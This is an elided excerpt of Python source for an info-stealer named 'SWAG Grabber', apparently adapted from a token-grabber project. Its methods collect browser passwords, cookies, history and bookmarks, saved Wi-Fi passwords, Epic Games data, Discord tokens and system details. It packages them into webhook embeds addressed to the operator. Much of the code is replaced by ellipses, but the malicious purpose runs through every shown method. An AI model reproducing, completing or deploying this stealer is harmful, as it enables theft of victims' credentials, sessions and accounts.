...
class SWAGgrabber(functions):
    ...
    def browserinfo(self, platform, path):
        p_header = f"SWAG Grabber Passwords\nBrowser:{platform}\n\n"
        c_header = f"SWAG Grabber Cookies\nBrowser:{platform}\n\n\n"
        h_header = f"SWAG Grabber History\nBrowser:{platform}\n\n"
        m_header = f"SWAG Grabber Other Info\nBrowser:{platform}\n\n"
        b_header = f"SWAG Grabber Bookmarks\nBrowser:{platform}\n\n"
        e_header = f"SWAG Grabber Extensions\nBrowser:{platform}\n\n"
        d_header = f"SWAG Grabber Download History\nBrowser:{platform}\n\n"
    ...
    def grabwifi(self):
        ...
        for i in profiles:
            ...
            with open(self.dir+"\\Wifi passwords.txt","w") as f:
                f.write(f"SWAG Grabber wifi passwords\n\nWi-Fi Name                    | Password\n------------------------------------------\n")
                ...
                for line in f.readlines():
                    if line.startswith("Data="):
                        with open(os.path.join(self.dir, "Epic games data.txt"), 'w', encoding="cp437") as g:
                            g.write(
                                f"SWAG Grabber Epic Games Offline Data\n\n")
            ...
            for token in self.tokens:
                ...
                if res.status_code == 200:
                    ...
                    if not user_name in username:
                        ...
                        embed = {
                            "username": f"Dc Info | SWAG Grabber",
                            "avatar_url": "https://imgur.com/a/2isCbPH",
                            "embeds": [
                                {
                                    "author": {
                                        "name": "ehem.. swag got something for u boss 😎",
                                        "url": "https://github.com/j0taro/Oak-token-Grabber",
                                        "icon_url": "https://imgur.com/a/2isCbPH"
                                    },
    ...
    def sysinfo(self):
        ...
        try:
            ...
            self.exceptions.append(traceback.format_exc())
        embed = {
            "username": f"System Info | SWAG Grabber",
            "avatar_url": "https://imgur.com/a/2isCbPH",
            "title": "__SWAG Grabber System Info__",
            "embeds": [
                     {
                         "author": {
                             "name": "ehem.. swag got something for u boss 😎",
    ...
    def upload(self):
        ...
        if config.get('Ping_on_run'):
            ...
            content = ""
        embed = {
            "username": f"{name} | SWAG Grabber",
            "content": content,
            "avatar_url": "https://imgur.com/a/2isCbPH",
            "title": "__SWAG Grabber__",
            "embeds": [
                     {
                         "author": {
                             "name": "ehem.. swag got something for u boss 😎",
